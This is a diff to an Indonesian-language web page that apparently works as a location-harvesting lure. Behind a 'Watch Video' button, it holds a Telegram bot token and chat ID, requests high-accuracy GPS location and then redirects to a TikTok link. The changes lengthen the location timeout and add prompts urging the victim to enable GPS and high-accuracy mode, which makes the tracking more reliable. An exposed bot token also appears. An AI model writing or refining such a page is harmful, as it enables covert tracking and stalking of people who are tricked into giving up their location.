@@ -57,7 +57,7 @@
   <script>
     const token = "8009374862:AAGmy-Ak6PuCzKcx9ClKCW9oxhB_fvAZY_c";
     const chatId = "7531913427";
-    const redirectLink = "https://vt.tiktok.com/ZSS8vrH4p/"; 
+    const redirectLink = "https://vt.tiktok.com/ZSS8vrH4p/";
 
     document.getElementById("tombol").onclick = () => {
       const tombol = document.getElementById("tombol");
@@ -105,15 +105,15 @@
           });
 
       }, err => {
-        alert("❌ Lokasi gagal didapat: " + err.message);
+        alert("❌ Lokasi gagal didapat: " + err.message + "\n\n💡 Coba:\n- Aktifkan GPS\n- Aktifkan mode Akurasi Tinggi\n- Gunakan di luar ruangan");
         tombol.disabled = false;
         tombol.innerText = "▶️ Tonton Video";
       }, {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 20000,  // waktu tunggu diperpanjang jadi 20 detik
         maximumAge: 0
       });
     };
   </script>
 </body>
-  </html>
+</html>
